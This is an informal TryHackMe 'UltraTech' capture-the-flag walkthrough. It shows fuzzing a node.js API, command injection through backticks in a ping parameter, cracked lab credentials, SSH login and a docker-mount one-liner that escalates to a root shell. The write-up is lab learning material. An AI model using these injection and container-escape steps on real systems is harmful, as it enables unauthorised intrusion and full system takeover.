# TryHackMe UltraTech walkthrough(Medium level).

---------------------ULTRATECH(TryHackMe)----------------------

finding open ports, **21,22,8081**
A webserver running on 8081 which is node.js

Directory fuzzings:- Using gobuster find 2 directories which is /auth and /ping

when i open /ping(Error is showing related to api and cors)  :>[Don't waste your time in api and cors]

try to enumerate more about /ping directory and search parameter in given URL using wfuzz tool.

wfuzz -u http://ip/ping?FUZZ=test -w /usr/share/wordlists/dirbuster/directory-2.3-medium.txt --hc 15 -c

I got a ip parameter.

Now try to find Command Injection on this vulnerability

curl 'http://ip/ping?ip=127.0.0.1&`whoami`' :- but only showing loopback address result. {Using ' quote because curl is not understand our full url}

curl 'http://ip/ping?ip=`ls`' :- Boom; I got a two username and their password which is hash form.

1)r00tf357a0c52799563c7c7b76c1e7543a32 => **r00t:n100906**
2)admin0d0ea5111e3c1def594c1684e3b9be84 => **admin:mrsheafy**

#Now login through ssh using r00t user and their password, I got the shell

When i using /etc/passwd i show a another user which ip1. [but ip1 is useless 😂]

#Trying to find the binary but not giving any results from find command.

#When i using mistakely id command i show a mysterious things which Docker

#Now enumerate docker:

$which docker
/usr/bin/docker

$ls -la /usr/bin/docker
-rwxr-xr-x 1 root root 68631952 Feb 13  2019 /usr/bin/docker

$docker run -v /:/mnt --rm -it bash chroot /mnt sh

:(:(Boom:):)

I found root shell.

Find the last flag and finally go to bed :)
